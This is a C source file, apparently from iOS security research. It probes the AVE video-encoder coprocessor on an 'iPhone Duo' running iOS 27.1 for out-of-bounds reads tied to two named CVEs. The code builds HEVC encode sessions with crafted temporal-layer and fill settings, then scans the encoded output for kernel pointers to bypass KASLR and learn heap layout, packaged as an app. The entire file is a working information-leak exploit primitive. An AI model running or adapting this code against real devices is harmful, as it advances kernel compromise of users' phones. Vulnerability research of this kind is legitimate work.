/*
 * ave_infoleak_probe.c — AVE OOB Read Info Leak Probe
 *
 * Target: iPhone Duo (A20 Pro), iOS 27.1
 * Purpose: Investigate CVE-2026-112466/112465 (AVE OOB reads)
 * for KASLR bypass and heap layout information.
 *
 * Theory: By encoding with specific parameters, the AVE coprocessor
 * may read beyond its input buffer during encoding. The extra data
 * gets incorporated into the encoded bitstream, readable from userspace.
 *
 * Build:
 *   xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
 *     -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
 *     -framework CoreFoundation -framework IOSurface \
 *     -o ave_infoleak_probe ave_infoleak_probe.c -Wno-deprecated-declarations
 *
 * Deployed as: AVELeak.app (com.research.aveleak)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

typedef uint32_t IOSurfaceID;
typedef struct __IOSurface *IOSurfaceRef;
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef);

static FILE *out;
static uint8_t *g_encoded_data = NULL;
static size_t g_encoded_size = 0;

static void p(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt); vfprintf(out, fmt, ap); va_end(ap); fflush(out);
}

static void encode_cb(void *ref, void *buf, OSStatus st,
                       VTEncodeInfoFlags flags, CMSampleBufferRef sb) {
    int *count = (int *)ref;
    (*count)++;
    if (st != noErr || !sb) return;
    CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(sb);
    if (!bb) return;
    size_t len = CMBlockBufferGetDataLength(bb);
    if (len > 0 && len < 10*1024*1024) {
        g_encoded_data = realloc(g_encoded_data, len);
        g_encoded_size = len;
        char *dataPtr = NULL;
        CMBlockBufferGetDataPointer(bb, 0, NULL, NULL, &dataPtr);
        if (dataPtr) memcpy(g_encoded_data, dataPtr, len);
    }
}

static void analyze_encoded(const uint8_t *data, size_t len) {
    p("  Encoded size: %zu bytes\n", len);
    p("  First 128 bytes:\n");
    for (size_t i = 0; i < (len < 128 ? len : 128); i += 16) {
        p("  %04zx: ", i);
        for (size_t j = 0; j < 16 && i+j < len; j++) p("%02x ", data[i+j]);
        p("\n");
    }
    int kernel_ptrs = 0;
    for (size_t i = 0; i + 8 <= len; i++) {
        uint64_t val = 0; memcpy(&val, data + i, 8);
        if ((val >> 40) == 0xfffffe) {
            p("  KERNEL PTR at 0x%zx: 0x%016llx\n", i, (unsigned long long)val);
            if (++kernel_ptrs > 20) break;
        }
    }
    p("  Kernel pointers found: %d\n", kernel_ptrs);
}

static int test_infoleak(int width, int height, uint8_t fill, int ntl) {
    p("\n=== Info Leak: %dx%d fill=0x%02x NTL=%d ===\n", width, height, fill, ntl);

    CFMutableDictionaryRef srcAttrs = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef ioSurfProps = CFDictionaryCreate(
        kCFAllocatorDefault, NULL, NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(srcAttrs, kCVPixelBufferIOSurfacePropertiesKey, ioSurfProps);
    CFRelease(ioSurfProps);
    int pixfmt = kCVPixelFormatType_32BGRA;
    CFNumberRef fmtNum = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt);
    CFDictionarySetValue(srcAttrs, kCVPixelBufferPixelFormatTypeKey, fmtNum);
    CFRelease(fmtNum);

    int cb_count = 0;
    g_encoded_data = NULL; g_encoded_size = 0;

    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, width, height, kCMVideoCodecType_HEVC,
        NULL, srcAttrs, NULL, encode_cb, &cb_count, &session);
    CFRelease(srcAttrs);
    if (st != noErr || !session) { p("  Create failed: %d\n", (int)st); return -1; }

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
    int usage = 1;
    CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &usage);
    VTSessionSetProperty(session, CFSTR("EncoderUsage"), n); CFRelease(n);

    if (ntl > 0) {
        n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
        VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), n); CFRelease(n);
    }
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) { VTCompressionSessionInvalidate(session); CFRelease(session); return -1; }

    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(session);
    if (!pool) { VTCompressionSessionInvalidate(session); CFRelease(session); return -2; }

    CVPixelBufferRef pb = NULL;
    CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
    if (!pb) { VTCompressionSessionInvalidate(session); CFRelease(session); return -3; }

    IOSurfaceRef surf = CVPixelBufferGetIOSurface(pb);
    if (surf) p("  IOS id=%u alloc=%zu\n", IOSurfaceGetID(surf), IOSurfaceGetAllocSize(surf));

    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, fill, CVPixelBufferGetDataSize(pb));
    CVPixelBufferUnlockBaseAddress(pb, 0);

    st = VTCompressionSessionEncodeFrame(session, pb, CMTimeMake(0,30), CMTimeMake(1,30), NULL, NULL, NULL);
    p("  Encode: %d\n", (int)st);
    CVPixelBufferRelease(pb);
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);

    if (g_encoded_data && g_encoded_size > 0) {
        analyze_encoded(g_encoded_data, g_encoded_size);
        free(g_encoded_data); g_encoded_data = NULL;
    } else { p("  No encoded data\n"); }

    VTCompressionSessionInvalidate(session); CFRelease(session);
    return 0;
}

int main(int argc, char *argv[]) {
    char path[1024];
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    const char *mode = (argc >= 2) ? argv[1] : "info";
    snprintf(path, sizeof(path), "%s/Documents/ave_infoleak_%s.txt", home, mode);
    out = fopen(path, "w");
    if (!out) return 1;

    p("=== AVE Info Leak Probe ===\nMode: %s\nPID: %d\n", mode, getpid());
    char buf[256]; size_t len;
    len = sizeof(buf); sysctlbyname("kern.osversion", buf, &len, NULL, 0);
    p("Build: %s\n", buf);

    if (strcmp(mode, "baseline") == 0) { test_infoleak(1280,720,0x00,0); test_infoleak(1280,720,0xFF,0); }
    else if (strcmp(mode, "ntl_low") == 0) { test_infoleak(1280,720,0x00,9); test_infoleak(1280,720,0x00,16); test_infoleak(1280,720,0x00,32); }
    else if (strcmp(mode, "small") == 0) { test_infoleak(128,128,0x00,0); test_infoleak(128,128,0x00,9); test_infoleak(128,128,0xFF,9); }
    else if (strcmp(mode, "compare") == 0) { test_infoleak(1280,720,0x41,0); test_infoleak(1280,720,0x41,9); }
    else { p("Modes: baseline ntl_low small compare\n"); }

    p("\n=== Done ===\n");
    fclose(out);
    return 0;
}
